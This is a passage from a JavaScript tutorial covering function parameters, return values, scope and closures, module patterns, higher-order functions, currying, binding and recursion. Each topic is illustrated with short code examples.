  const args = Array.from(arguments);
  const args2 = [...arguments];
  
  // ES5
  const args3 = Array.prototype.slice.call(arguments);
}
```

---

### Properties

**`length` (number of arguments):**

```javascript
function f(a, b) {
  console.log(arguments.length);
}

f(1, 2, 3);  // 3 (actual arguments passed)
console.log(f.length);  // 2 (defined parameters)
```

**`callee` (the function itself):**

```javascript
function factorial(n) {
  if (n <= 1) return 1;
  return n * arguments.callee(n - 1);
}

// Forbidden in strict mode
"use strict";
function f() {
  console.log(arguments.callee);  // TypeError
}
```

---

### Aliasing (Sloppy Mode)

**In sloppy mode, `arguments` tracks parameter changes:**

```javascript
function f(x) {
  x = 10;
  console.log(arguments[0]);  // 10 (aliased)
}

f(5);
```

**In strict mode, no aliasing:**

```javascript
"use strict";
function f(x) {
  x = 10;
  console.log(arguments[0]);  // 5 (not aliased)
}

f(5);
```

---

### Not Available in Arrow Functions

```javascript
const arrow = () => {
  console.log(arguments);  // ReferenceError
};

// Use rest parameters instead
const withRest = (...args) => {
  console.log(args);  // Works
};
```

---

### Modern Alternative: Rest Parameters

**Prefer rest parameters:**

```javascript
// Old way (avoid)
function sum() {
  return Array.from(arguments).reduce((a, b) => a + b, 0);
}

// Modern way (prefer)
function sum(...numbers) {
  return numbers.reduce((a, b) => a + b, 0);
}
```

---

### 3.3.4 Parameter Destructuring

### Array Destructuring

```javascript
function sum([a, b]) {
  return a + b;
}

sum([5, 3]);  // 8

// With rest
function first([head, ...tail]) {
  console.log(head);  // 1
  console.log(tail);  // [2, 3]
}

first([1, 2, 3]);
```

---

### Object Destructuring

```javascript
function greet({ name, age }) {
  return `${name} is ${age} years old`;
}

greet({ name: "Alice", age: 30 });  // "Alice is 30 years old"

// With defaults
function greet({ name = "Guest", age = 0 } = {}) {
  return `${name} is ${age} years old`;
}

greet();  // "Guest is 0 years old"
greet({ name: "Bob" });  // "Bob is 0 years old"
```

---

### Nested Destructuring

```javascript
function processUser({ name, address: { city, country } }) {
  console.log(`${name} lives in ${city}, ${country}`);
}

processUser({
  name: "Alice",
  address: { city: "NYC", country: "USA" }
});
// "Alice lives in NYC, USA"
```

---

### Renaming

```javascript
function greet({ name: userName }) {
  return `Hello, ${userName}!`;
}

greet({ name: "Alice" });  // "Hello, Alice!"
```

---

### With Rest

```javascript
function process({ id, ...rest }) {
  console.log(id);    // 1
  console.log(rest);  // { name: "Alice", age: 30 }
}

process({ id: 1, name: "Alice", age: 30 });
```

---

### 3.3.5 Spread in Function Calls

### Basic Usage

```javascript
function sum(a, b, c) {
  return a + b + c;
}

const numbers = [1, 2, 3];
sum(...numbers);  // 6 (same as sum(1, 2, 3))
```

---

### Combining with Regular Arguments

```javascript
function greet(greeting, ...names) {
  return `${greeting}, ${names.join(" and ")}!`;
}

const people = ["Alice", "Bob"];
greet("Hello", ...people);  // "Hello, Alice and Bob!"
```

---

### Multiple Spreads

```javascript
function sum(...numbers) {
  return numbers.reduce((a, b) => a + b, 0);
}

const arr1 = [1, 2, 3];
const arr2 = [4, 5, 6];

sum(...arr1, ...arr2);  // 21
```

---

### With Other Values

```javascript
function log(a, b, c, d, e) {
  console.log(a, b, c, d, e);
}

log(1, ...[2, 3], 4, 5);  // 1, 2, 3, 4, 5
```

---

### Spread Any Iterable

```javascript
const str = "hello";
console.log(...str);  // "h" "e" "l" "l" "o"

const set = new Set([1, 2, 3]);
Math.max(...set);  // 3
```

---


## 3.4 Return Values


### 3.4.1 Explicit Return

### Basic Syntax

```javascript
function add(a, b) {
  return a + b;
}

const result = add(5, 3);  // 8
```

---

### Early Return

```javascript
function validate(input) {
  if (!input) return false;
  if (input.length < 3) return false;
  return true;
}
```

---

### Returning Different Types

```javascript
function process(x) {
  if (x < 0) return null;
  if (x === 0) return "zero";
  if (x < 10) return x;
  return { value: x };
}
```

---

### No Return Value (Returns `undefined`)

```javascript
function log(message) {
  console.log(message);
  // No return statement
}

const result = log("hello");
console.log(result);  // undefined
```

---

### Explicit `undefined` Return

```javascript
function maybeReturn(condition) {
  if (condition) {
    return "value";
  }
  return undefined;  // Explicit
  // or: return;
  // or: (omit return)
}
```

---

### 3.4.2 Implicit Return (Arrow Functions)

### Single Expression

```javascript
const double = x => x * 2;

const add = (a, b) => a + b;

const greet = name => `Hello, ${name}!`;
```

---

### Object Literal (Must Wrap)

```javascript
const makeUser = (name, age) => ({ name, age });

// Without parens: interpreted as block
const broken = (name, age) => { name, age };  // undefined
```

---

### Multi-Line Expression

```javascript
const transform = data =>
  data
    .map(x => x * 2)
    .filter(x => x > 10)
    .reduce((sum, x) => sum + x, 0);
```

---

### Conditional Return

```javascript
const abs = x => x >= 0 ? x : -x;

const sign = x =>
  x > 0 ? 1 :
  x < 0 ? -1 : 0;
```

---

### 3.4.3 Returning Multiple Values

### Using Arrays

```javascript
function getCoordinates() {
  return [10, 20];
}

const [x, y] = getCoordinates();
console.log(x, y);  // 10, 20
```

---

### Using Objects

```javascript
function getUser() {
  return {
    name: "Alice",
    age: 30,
    email: "alice@example.com"
  };
}

const { name, age } = getUser();
console.log(name, age);  // "Alice", 30
```

---

### Choosing Between Array and Object

**Use array when:**

- Order matters
- Values are homogeneous
- Positional access makes sense

```javascript
function getDimensions() {
  return [width, height];
}

const [w, h] = getDimensions();
```

**Use object when:**

- Named values more readable
- May skip some values
- May add more values later

```javascript
function getStats() {
  return { min, max, avg, median };
}

const { min, max } = getStats();  // Can skip avg, median
```

---

### Nested Destructuring

```javascript
function getData() {
  return {
    user: {
      name: "Alice",
      age: 30
    },
    posts: [1, 2, 3]
  };
}

const {
  user: { name, age },
  posts: [firstPost]
} = getData();
```

---

### 3.4.4 Return Value Best Practices

### Be Consistent

**Bad:**

```javascript
function getUser(id) {
  const user = database.find(id);
  if (user) return user;
  return null;  // Sometimes object, sometimes null
}
```

**Good:**

```javascript
function getUser(id) {
  return database.find(id) || null;
}

// Or always return object
function getUser(id) {
  return database.find(id) || { error: "Not found" };
}
```

---

### Document Return Types (JSDoc)

```javascript
/**
 * Get user by ID
 * @param {number} id - User ID
 * @returns {Object|null} User object or null if not found
 */
function getUser(id) {
  return database.find(id) || null;
}
```

---

### Avoid Too Many Return Points

**Hard to follow:**

```javascript
function complex(x) {
  if (x < 0) return "negative";
  if (x === 0) return "zero";
  if (x < 10) return "small";
  if (x < 100) return "medium";
  if (x < 1000) return "large";
  return "huge";
}
```

**Better:**

```javascript
function complex(x) {
  if (x < 0) return "negative";
  if (x === 0) return "zero";
  
  if (x < 10) return "small";
  if (x < 100) return "medium";
  if (x < 1000) return "large";
  
  return "huge";
}

// Or use lookup
const ranges = [
  [0, "negative"],
  [10, "small"],
  [100, "medium"],
  [1000, "large"],
  [Infinity, "huge"]
];
```

---

## Summary

### Function Types

|Feature|Declaration|Expression|Arrow|
|---|---|---|---|
|**Hoisting**|Full|Variable only|Variable only|
|**`this`**|Dynamic|Dynamic|Lexical|
|**`arguments`**|Yes|Yes|No|
|**Constructor**|Yes|Yes|No|
|**Implicit return**|No|No|Yes (single expr)|
|**`super`**|Yes|Yes|No|

---

### Parameter Features

- **Default parameters**: `function f(x = 0) { }`
- **Rest parameters**: `function f(...args) { }`
- **Destructuring**: `function f({ x, y }) { }`
- **Spread in calls**: `f(...arr)`
- **`arguments` object**: Array-like, all args (not in arrows)

---

### Best Practices

1. **Prefer `const`** for function expressions
2. **Use arrow functions** for callbacks and lexical `this`
3. **Use regular functions** for methods and constructors
4. **Use rest parameters** over `arguments`
5. **Use destructuring** for complex parameters
6. **Use implicit return** for simple arrow functions
7. **Return consistent types** from functions
8. **Document return types** with JSDoc
9. **Use named function expressions** for stack traces
10. **Prefer `function` declarations** for top-level functions

---

## 3.5 Scope and Closures


### 3.5.1 Lexical Scope

### Definition

**Lexical scope** (static scope) means a variable's scope is determined by its position in the source code at write-time, not at run-time.

```javascript
function outer() {
  const x = 10;
  
  function inner() {
    console.log(x);  // Can access x (lexically enclosed)
  }
  
  inner();
}

outer();  // 10
```

---

### Scope Chain

When a variable is referenced, JavaScript searches:

1. **Current scope**
2. **Outer scope** (enclosing function)
3. **Outer-outer scope** (and so on)
4. **Global scope**
5. **ReferenceError** if not found

```javascript
const global = "global";

function outer() {
  const outerVar = "outer";
  
  function inner() {
    const innerVar = "inner";
    
    console.log(innerVar);   // 1. Current scope
    console.log(outerVar);   // 2. Outer scope
    console.log(global);     // 3. Global scope
    console.log(notDefined); // ReferenceError
  }
  
  inner();
}

outer();
```

---

### Shadowing

**Inner variables shadow outer variables:**

```javascript
const x = "global";

function outer() {
  const x = "outer";
  
  function inner() {
    const x = "inner";
    console.log(x);  // "inner" (shadows outer variables)
  }
  
  inner();
  console.log(x);  // "outer"
}

outer();
console.log(x);  // "global"
```

---

### Lexical vs Dynamic Scope

**JavaScript uses lexical scope:**

```javascript
const x = "global";

function foo() {
  console.log(x);  // Looks up lexically, not where it's called
}

function bar() {
  const x = "local";
  foo();  // What does this log?
}

bar();  // "global" (not "local")
```

**In dynamic scope (not JavaScript), it would log `"local"` because `foo` was called from `bar`.**

---

### 3.5.2 Function Scope

### `var` is Function-Scoped

```javascript
function example() {
  if (true) {
    var x = 10;
  }
  console.log(x);  // 10 (accessible outside if block)
}

example();
```

---

### Functions Create Scope

**Each function creates its own scope:**

```javascript
function outer() {
  const x = 10;
  
  function inner1() {
    const y = 20;
    console.log(x);  // 10 (can access outer)
  }
  
  function inner2() {
    console.log(y);  // ReferenceError (cannot access inner1's y)
  }
  
  inner1();
  inner2();
}
```

---

### Nested Functions

```javascript
function level1() {
  const a = 1;
  
  function level2() {
    const b = 2;
    
    function level3() {
      const c = 3;
      console.log(a, b, c);  // 1, 2, 3 (access all outer scopes)
    }
    
    level3();
  }
  
  level2();
}

level1();
```

---

### 3.5.3 Block Scope

### `let` and `const` are Block-Scoped

```javascript
{
  const x = 10;
  let y = 20;
  console.log(x, y);  // 10, 20
}

console.log(x);  // ReferenceError
console.log(y);  // ReferenceError
```

---

### Blocks Create Scope

**All blocks create scope for `let`/`const`:**

```javascript
// if block
if (true) {
  const x = 10;
}
console.log(x);  // ReferenceError

// for block
for (let i = 0; i < 5; i++) {
  const x = i;
}
console.log(i);  // ReferenceError
console.log(x);  // ReferenceError

// while block
while (condition) {
  const x = 10;
}

// switch block (single scope for all cases)
switch (value) {
  case 1:
    const x = 10;  // Available in entire switch
    break;
}

// Standalone block
{
  const x = 10;
}
```

---

### Loop Iterations Create Separate Scopes

**`let` in `for` loop creates per-iteration binding:**

```javascript
for (let i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100);
}
// 0, 1, 2 (each iteration has its own i)

// vs var (single binding)
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100);
}
// 3, 3, 3
```

**How it works internally:**

```javascript
// Conceptual transformation
{
  let i = 0;
  {
    let i_0 = i;
    setTimeout(() => console.log(i_0), 100);
  }
  i++;
  {
    let i_1 = i;
    setTimeout(() => console.log(i_1), 100);
  }
  i++;
  // etc.
}
```

---

### Temporal Dead Zone (TDZ)

**Variables exist but cannot be accessed before declaration:**

```javascript
{
  // TDZ starts for x
  console.log(x);  // ReferenceError
  // TDZ continues
  let x = 10;  // TDZ ends
  console.log(x);  // 10
}
```

---

### 3.5.4 Closure Mechanism

### Why Closures Matter

Closures are one of JavaScript's most powerful features. They enable:

- **Data privacy** â€” Variables hidden from outside access
- **State persistence** â€” Functions that "remember" values between calls
- **Factory functions** â€” Creating customized functions dynamically
- **Callbacks** â€” Event handlers that access outer variables
- **Module pattern** â€” Encapsulation before ES6 modules existed

Without closures, JavaScript would lack fundamental patterns like private variables, memoization, and partial application.

### Definition

A **closure** is a function that retains access to its lexical scope even when the function is executed outside that scope. In simpler terms: **a function "remembers" the variables from where it was created, not where it's called.**

```javascript
function outer() {
  const x = 10;
  
  function inner() {
    console.log(x);  // Closure: inner "closes over" x
  }
  
  return inner;
}

const fn = outer();  // outer() has finished executing
fn();  // 10 (but x is still accessible!)
```

---

### How Closures Work

**When a function is created, it stores a reference to its lexical environment:**

```javascript
function makeCounter() {
  let count = 0;
  
  return function() {
    count++;
    return count;
  };
}

const counter1 = makeCounter();
const counter2 = makeCounter();

console.log(counter1());  // 1
console.log(counter1());  // 2
console.log(counter1());  // 3

console.log(counter2());  // 1 (separate closure)
console.log(counter2());  // 2
```

**Each call to `makeCounter()` creates a new lexical environment with its own `count`.**

---

### Closure Scope Chain

**Closures retain entire scope chain:**

```javascript
const global = "global";

function outer() {
  const outerVar = "outer";
  
  function middle() {
    const middleVar = "middle";
    
    function inner() {
      console.log(global);     // Accesses global
      console.log(outerVar);   // Accesses outer
      console.log(middleVar);  // Accesses middle
    }
    
    return inner;
  }
  
  return middle();
}

const fn = outer();
fn();  // All variables accessible
```

---

### Closures Capture Variables, Not Values

```javascript
function createFunctions() {
  const funcs = [];
  
  for (var i = 0; i < 3; i++) {
    funcs.push(function() {
      console.log(i);  // Captures variable i, not value
    });
  }
  
  return funcs;
}

const funcs = createFunctions();
funcs[0]();  // 3 (not 0!)
funcs[1]();  // 3
funcs[2]();  // 3

// All functions reference same i, which is 3 after loop
```

**Fix with `let` (creates per-iteration binding):**

```javascript
function createFunctions() {
  const funcs = [];
  
  for (let i = 0; i < 3; i++) {
    funcs.push(function() {
      console.log(i);
    });
  }
  
  return funcs;
}

const funcs = createFunctions();
funcs[0]();  // 0
funcs[1]();  // 1
funcs[2]();  // 2
```

**Or IIFE (pre-ES6):**

```javascript
for (var i = 0; i < 3; i++) {
  (function(j) {
    funcs.push(function() {
      console.log(j);
    });
  })(i);
}
```

---

### 3.5.5 Closure Use Cases

### Private Variables

**Encapsulate data:**

```javascript
function createPerson(name) {
  // Private variable
  let _name = name;
  
  return {
    getName() {
      return _name;
    },
    setName(newName) {
      if (typeof newName === "string") {
        _name = newName;
      }
    }
  };
}

const person = createPerson("Alice");
console.log(person.getName());  // "Alice"
person.setName("Bob");
console.log(person.getName());  // "Bob"
console.log(person._name);      // undefined (private)
```

---

### Function Factories

**Create specialized functions:**

```javascript
function multiplier(factor) {
  return function(x) {
    return x * factor;
  };
}

const double = multiplier(2);
const triple = multiplier(3);

console.log(double(5));  // 10
console.log(triple(5));  // 15
```

---

### Event Handlers

**Capture context:**

```javascript
function setupButton(buttonId, message) {
  const button = document.getElementById(buttonId);
  
  button.addEventListener("click", function() {
    alert(message);  // Closure over message
  });
}

setupButton("btn1", "Button 1 clicked");
setupButton("btn2", "Button 2 clicked");
```

---

### Memoization

**Cache results:**

```javascript
function memoize(fn) {
  const cache = {};
  
  return function(...args) {
    const key = JSON.stringify(args);
    
    if (key in cache) {
      return cache[key];
    }
    
    const result = fn(...args);
    cache[key] = result;
    return result;
  };
}

const factorial = memoize(function(n) {
  console.log(`Computing ${n}!`);
  if (n <= 1) return 1;
  return n * factorial(n - 1);
});

factorial(5);  // Computes 5, 4, 3, 2, 1
factorial(5);  // Returns cached result
factorial(6);  // Only computes 6 (reuses cached 5!)
```

---

### Iterators and Generators

```javascript
function createIterator(array) {
  let index = 0;
  
  return {
    next() {
      if (index < array.length) {
        return { value: array[index++], done: false };
      }
      return { done: true };
    }
  };
}

const iter = createIterator([1, 2, 3]);
console.log(iter.next());  // { value: 1, done: false }
console.log(iter.next());  // { value: 2, done: false }
console.log(iter.next());  // { value: 3, done: false }
console.log(iter.next());  // { done: true }
```

---

### Partial Application

```javascript
function partial(fn, ...fixedArgs) {
  return function(...remainingArgs) {
    return fn(...fixedArgs, ...remainingArgs);
  };
}

function greet(greeting, name) {
  return `${greeting}, ${name}!`;
}

const sayHello = partial(greet, "Hello");
console.log(sayHello("Alice"));  // "Hello, Alice!"
console.log(sayHello("Bob"));    // "Hello, Bob!"
```

---

### 3.5.6 Module Pattern with Closures

### Revealing Module Pattern

```javascript
const calculator = (function() {
  // Private variables
  let result = 0;
  
  // Private functions
  function validate(x) {
    return typeof x === "number";
  }
  
  // Public API
  return {
    add(x) {
      if (validate(x)) {
        result += x;
      }
      return this;
    },
    
    subtract(x) {
      if (validate(x)) {
        result -= x;
      }
      return this;
    },
    
    getResult() {
      return result;
    },
    
    reset() {
      result = 0;
      return this;
    }
  };
})();

calculator.add(10).add(5).subtract(3);
console.log(calculator.getResult());  // 12
console.log(calculator.result);       // undefined (private)
console.log(calculator.validate);     // undefined (private)
```

---

### Singleton Pattern

```javascript
const database = (function() {
  let instance;
  
  function init() {
    // Private
    const data = [];
    
    return {
      insert(item) {
        data.push(item);
      },
      
      query() {
        return data.slice();  // Return copy
      }
    };
  }
  
  return {
    getInstance() {
      if (!instance) {
        instance = init();
      }
      return instance;
    }
  };
})();

const db1 = database.getInstance();
const db2 = database.getInstance();

db1.insert("item1");
console.log(db2.query());  // ["item1"] (same instance)
console.log(db1 === db2);  // true
```

---

### Namespace Pattern

```javascript
const MyApp = (function() {
  // Namespace for different modules
  const utils = (function() {
    return {
      formatDate(date) {
        // ...
      },
      
      capitalize(str) {
        return str.charAt(0).toUpperCase() + str.slice(1);
      }
    };
  })();
  
  const api = (function() {
    const baseURL = "https://api.example.com";
    
    return {
      get(endpoint) {
        return fetch(`${baseURL}/${endpoint}`);
      }
    };
  })();
  
  return {
    utils,
    api
  };
})();

MyApp.utils.capitalize("hello");  // "Hello"
MyApp.api.get("users");
```

---

### 3.5.7 Memory Considerations

### Closures and Memory

**Closures retain references to outer scope:**

```javascript
function heavy() {
  const bigData = new Array(1000000).fill("data");
  
  return function() {
    console.log(bigData[0]);  // Closure retains bigData
  };
}

const fn = heavy();
// bigData cannot be garbage collected (fn holds reference)
```

---

### Memory Leaks

**Unintentional retention:**

```javascript
function setupHandler() {
  const element = document.getElementById("big-element");
  const data = new Array(1000000).fill("data");
  
  element.addEventListener("click", function() {
    console.log(data[0]);  // Closure retains data
  });
}

// If element is removed but event listener not cleaned up,
// data stays in memory
```

**Fix: Clean up:**

```javascript
function setupHandler() {
  const element = document.getElementById("big-element");
  const data = new Array(1000000).fill("data");
  
  const handler = function() {
    console.log(data[0]);
  };
  
  element.addEventListener("click", handler);
  
  // Clean up when done
  return function cleanup() {
    element.removeEventListener("click", handler);
  };
}

const cleanup = setupHandler();
// Later:
cleanup();
```

---

### Only Capture What's Needed

**Bad: Captures entire scope:**

```javascript
function outer() {
  const hugeData = new Array(1000000).fill("data");
  const smallValue = 42;
  
  return function() {
    console.log(smallValue);  // Also retains hugeData!
  };
}
```

**Good: Extract what's needed:**

```javascript
function outer() {
  const hugeData = new Array(1000000).fill("data");
  const smallValue = 42;
  
  // Process hugeData...
  const result = processData(hugeData);
  
  return function() {
    console.log(result);  // Only retains result, not hugeData
  };
}
```

---

### WeakMap for Private Data

**Modern alternative to closures for private data:**

```javascript
const privateData = new WeakMap();

class Person {
  constructor(name) {
    privateData.set(this, { name });
  }
  
  getName() {
    return privateData.get(this).name;
  }
  
  setName(name) {
    privateData.get(this).name = name;
  }
}

const person = new Person("Alice");
console.log(person.getName());  // "Alice"
// When person is garbage collected, privateData entry is too
```

---

### 3.5.8 Best Practices

1. **Use closures for data privacy**
2. **Be aware of memory retention**
3. **Clean up event listeners**
4. **Only capture variables you need**
5. **Use `let` in loops** (creates per-iteration binding)
6. **Document closure dependencies**
7. **Consider WeakMap** for private data in classes
8. **Profile memory** if closures are used heavily

---


## 3.6 Advanced Function Concepts


### 3.6.1 Higher-Order Functions

### Definition

A **higher-order function** either:

1. Takes one or more functions as arguments, OR
2. Returns a function

---

### Functions as Arguments

```javascript
// Higher-order function
function map(array, fn) {
  const result = [];
  for (let item of array) {
    result.push(fn(item));
  }
  return result;
}

// Usage
const numbers = [1, 2, 3, 4, 5];
const doubled = map(numbers, x => x * 2);
console.log(doubled);  // [2, 4, 6, 8, 10]
```

---

### Functions as Return Values

```javascript
function greeter(greeting) {
  return function(name) {
    return `${greeting}, ${name}!`;
  };
}

const sayHello = greeter("Hello");
const sayHi = greeter("Hi");

console.log(sayHello("Alice"));  // "Hello, Alice!"
console.log(sayHi("Bob"));       // "Hi, Bob!"
```

---

### Built-In Higher-Order Functions

```javascript
// Array methods
[1, 2, 3, 4, 5]
  .map(x => x * 2)        // [2, 4, 6, 8, 10]
  .filter(x => x > 5)     // [6, 8, 10]
  .reduce((sum, x) => sum + x, 0);  // 24

// setTimeout, setInterval
setTimeout(() => console.log("delayed"), 1000);

// Event listeners
button.addEventListener("click", () => console.log("clicked"));

// Promise methods
Promise.resolve(42).then(x => x * 2);
```

---

### Creating Utilities

```javascript
function repeat(n, fn) {
  for (let i = 0; i < n; i++) {
    fn(i);
  }
}

repeat(3, i => console.log(`Iteration ${i}`));
// Iteration 0
// Iteration 1
// Iteration 2
```

---

### 3.6.2 Callbacks

### Definition

A **callback** is a function passed as an argument to be executed later.

---

### Synchronous Callbacks

```javascript
function processArray(array, callback) {
  const result = [];
  for (let item of array) {
    result.push(callback(item));
  }
  return result;
}

const numbers = [1, 2, 3];
const squared = processArray(numbers, x => x * x);
console.log(squared);  // [1, 4, 9]
```

---

### Asynchronous Callbacks

```javascript
function fetchData(url, callback) {
  setTimeout(() => {
    const data = { id: 1, name: "Alice" };
    callback(data);
  }, 1000);
}

fetchData("https://api.example.com/user/1", (data) => {
  console.log(data);  // After 1 second
});
```

---

### Error-First Callbacks (Node.js Convention)

```javascript
function readFile(path, callback) {
  setTimeout(() => {
    if (path === "error.txt") {
      callback(new Error("File not found"), null);
    } else {
      callback(null, "File contents");
    }
  }, 100);
}

readFile("data.txt", (err, data) => {
  if (err) {
    console.error(err.message);
    return;
  }
  console.log(data);
});
```

---

### Callback Hell (Pyramid of Doom)

```javascript
asyncOperation1((err1, result1) => {
  if (err1) return handleError(err1);
  
  asyncOperation2(result1, (err2, result2) => {
    if (err2) return handleError(err2);
    
    asyncOperation3(result2, (err3, result3) => {
      if (err3) return handleError(err3);
      
      console.log(result3);
    });
  });
});
```

**Solution: Promises or async/await:**

```javascript
// Promises
asyncOperation1()
  .then(result1 => asyncOperation2(result1))
  .then(result2 => asyncOperation3(result2))
  .then(result3 => console.log(result3))
  .catch(handleError);

// Async/await
try {
  const result1 = await asyncOperation1();
  const result2 = await asyncOperation2(result1);
  const result3 = await asyncOperation3(result2);
  console.log(result3);
} catch (error) {
  handleError(error);
}
```

---

### 3.6.3 Function Composition

### Definition

**Function composition** is combining two or more functions to create a new function.

---

### Basic Composition

```javascript
const add = x => x + 1;
const multiply = x => x * 2;

// Manual composition
const addThenMultiply = x => multiply(add(x));
console.log(addThenMultiply(5));  // 12 ((5 + 1) * 2)
```

---

### Compose Function

**Right-to-left composition:**

```javascript
function compose(...fns) {
  return function(x) {
    return fns.reduceRight((acc, fn) => fn(acc), x);
  };
}

const add = x => x + 1;
const multiply = x => x * 2;
const square = x => x * x;

const composed = compose(square, multiply, add);
console.log(composed(5));  // 144
// Execution: add(5) -> multiply(6) -> square(12) -> 144
```

---

### Pipe Function

**Left-to-right composition:**

```javascript
function pipe(...fns) {
  return function(x) {
    return fns.reduce((acc, fn) => fn(acc), x);
  };
}

const add = x => x + 1;
const multiply = x => x * 2;
const square = x => x * x;

const piped = pipe(add, multiply, square);
console.log(piped(5));  // 144
// Execution: add(5) -> multiply(6) -> square(12) -> 144
```

---

### Practical Example

```javascript
const users = [
  { name: "alice smith", age: 30 },
  { name: "bob jones", age: 25 },
  { name: "charlie brown", age: 35 }
];

const capitalize = str =>
  str.charAt(0).toUpperCase() + str.slice(1);

const capitalizeWords = str =>
  str.split(" ").map(capitalize).join(" ");

const getNames = users => users.map(u => u.name);
const capitalizeNames = names => names.map(capitalizeWords);
const sortNames = names => names.sort();

const processUsers = pipe(
  getNames,
  capitalizeNames,
  sortNames
);

console.log(processUsers(users));
// ["Alice Smith", "Bob Jones", "Charlie Brown"]
```

---

### 3.6.4 Currying

### Definition

**Currying** transforms a function with multiple arguments into a sequence of functions, each taking a single argument.

---

### Manual Currying

```javascript
// Regular function
function add(a, b, c) {
  return a + b + c;
}

add(1, 2, 3);  // 6

// Curried version
function addCurried(a) {
  return function(b) {
    return function(c) {
      return a + b + c;
    };
  };
}

addCurried(1)(2)(3);  // 6

// Or with arrow functions
const addCurried = a => b => c => a + b + c;
addCurried(1)(2)(3);  // 6
```

---

### Curry Utility

```javascript
function curry(fn) {
  return function curried(...args) {
    if (args.length >= fn.length) {
      return fn(...args);
    } else {
      return function(...nextArgs) {
        return curried(...args, ...nextArgs);
      };
    }
  };
}

// Usage
function add(a, b, c) {
  return a + b + c;
}

const curriedAdd = curry(add);

console.log(curriedAdd(1)(2)(3));     // 6
console.log(curriedAdd(1, 2)(3));     // 6
console.log(curriedAdd(1)(2, 3));     // 6
console.log(curriedAdd(1, 2, 3));     // 6
```

---

### Practical Use Cases

**Creating specialized functions:**

```javascript
const multiply = curry((a, b) => a * b);

const double = multiply(2);
const triple = multiply(3);

console.log(double(5));  // 10
console.log(triple(5));  // 15
```

**Reusable filters:**

```javascript
const filter = curry((fn, array) => array.filter(fn));

const numbers = [1, 2, 3, 4, 5];
const isEven = x => x % 2 === 0;
const isGreaterThan = curry((threshold, x) => x > threshold);

const filterEven = filter(isEven);
const filterGreaterThan3 = filter(isGreaterThan(3));

console.log(filterEven(numbers));        // [2, 4]
console.log(filterGreaterThan3(numbers)); // [4, 5]
```

---

### 3.6.5 Partial Application

### Definition

**Partial application** fixes some arguments of a function, producing a new function with fewer arguments.

---

### Manual Partial Application

```javascript
function greet(greeting, name) {
  return `${greeting}, ${name}!`;
}

function partial(fn, ...fixedArgs) {
  return function(...remainingArgs) {
    return fn(...fixedArgs, ...remainingArgs);
  };
}

const sayHello = partial(greet, "Hello");
const sayHi = partial(greet, "Hi");

console.log(sayHello("Alice"));  // "Hello, Alice!"
console.log(sayHi("Bob"));       // "Hi, Bob!"
```

---

### Partial vs Currying

**Partial application:**

```javascript
const partial = (fn, ...args) =>
  (...newArgs) => fn(...args, ...newArgs);

const add = (a, b, c) => a + b + c;
const add5 = partial(add, 5);

add5(10, 15);  // 30 (5 + 10 + 15)
```

**Currying:**

```javascript
const curry = fn =>
  function curried(...args) {
    return args.length >= fn.length
      ? fn(...args)
      : (...newArgs) => curried(...args, ...newArgs);
  };

const add = (a, b, c) => a + b + c;
const curriedAdd = curry(add);

curriedAdd(5)(10)(15);  // 30
```

**Key difference:**

- **Partial**: Apply some args, get function expecting remaining args
- **Currying**: Always returns single-arg functions until all args provided

---

### Using `bind` for Partial Application

```javascript
function greet(greeting, name) {
  return `${greeting}, ${name}!`;
}

const sayHello = greet.bind(null, "Hello");
console.log(sayHello("Alice"));  // "Hello, Alice!"
```

---

### 3.6.6 Function Binding

### `bind()` Method

**Creates new function with bound `this`:**

```javascript
const user = {
  name: "Alice",
  greet() {
    console.log(`Hello, ${this.name}`);
  }
};

user.greet();  // "Hello, Alice"

const greet = user.greet;
greet();  // "Hello, undefined" (lost this)

const boundGreet = user.greet.bind(user);
boundGreet();  // "Hello, Alice" (this bound to user)
```

---

### Binding with Arguments

```javascript
function multiply(a, b) {
  return a * b;
}

const double = multiply.bind(null, 2);
console.log(double(5));  // 10 (2 * 5)

const triple = multiply.bind(null, 3);
console.log(triple(5));  // 15 (3 * 5)
```

---

### `call()` Method

**Invoke function with specified `this` and arguments:**

```javascript
function greet(greeting) {
  return `${greeting}, ${this.name}!`;
}

const user = { name: "Alice" };

console.log(greet.call(user, "Hello"));  // "Hello, Alice!"
```

---

### `apply()` Method

**Like `call`, but arguments as array:**

```javascript
function greet(greeting, punctuation) {
  return `${greeting}, ${this.name}${punctuation}`;
}

const user = { name: "Alice" };

console.log(greet.apply(user, ["Hello", "!"]));  // "Hello, Alice!"
```

---

### Comparison

```javascript
function greet(greeting, punctuation) {
  return `${greeting}, ${this.name}${punctuation}`;
}

const user = { name: "Alice" };

// bind: returns new function
const boundGreet = greet.bind(user, "Hello");
boundGreet("!");  // "Hello, Alice!"

// call: invokes immediately, args individually
greet.call(user, "Hello", "!");  // "Hello, Alice!"

// apply: invokes immediately, args as array
greet.apply(user, ["Hello", "!"]);  // "Hello, Alice!"
```

---

### 3.6.7 IIFE Revisited

### Pattern

```javascript
(function() {
  // Code here
})();

// Alternative syntax
(function() {
  // Code here
}());
```

---

### Use Cases

**1. Private scope:**

```javascript
(function() {
  const secret = "hidden";
  console.log(secret);  // "hidden"
})();

console.log(secret);  // ReferenceError
```

**2. Avoid global pollution:**

```javascript
(function() {
  const helpers = {
    add(a, b) { return a + b; },
    multiply(a, b) { return a * b; }
  };
  
  // Use helpers
  console.log(helpers.add(5, 3));
})();

// helpers not in global scope
```

**3. Module pattern:**

```javascript
const myModule = (function() {
  const privateVar = "secret";
  
  function privateFunc() {
    return privateVar;
  }
  
  return {
    publicMethod() {
      return privateFunc();
    }
  };
})();

console.log(myModule.publicMethod());  // "secret"
console.log(myModule.privateVar);      // undefined
```

**4. With parameters:**

```javascript
(function(global, $) {
  // Use global and $ without risk of conflict
  global.myApp = { };
  $(".element").hide();
})(window, jQuery);
```

---

### 3.6.8 Recursion

### Definition

A **recursive function** calls itself.

---

### Basic Recursion

```javascript
function factorial(n) {
  if (n <= 1) return 1;  // Base case
  return n * factorial(n - 1);  // Recursive case
}

console.log(factorial(5));  // 120
// 5 * factorial(4)
// 5 * 4 * factorial(3)
// 5 * 4 * 3 * factorial(2)
// 5 * 4 * 3 * 2 * factorial(1)
// 5 * 4 * 3 * 2 * 1 = 120
```

---

### Recursive Patterns

**Counting:**

```javascript
function countdown(n) {
  if (n <= 0) {
    console.log("Done!");
    return;
  }
  console.log(n);
  countdown(n - 1);
}

countdown(3);  // 3, 2, 1, Done!
```

**Tree traversal:**

```javascript
function traverse(node) {
  console.log(node.value);
  
  if (node.children) {
    node.children.forEach(child => traverse(child));
  }
}

const tree = {
  value: 1,
  children: [
    { value: 2 },
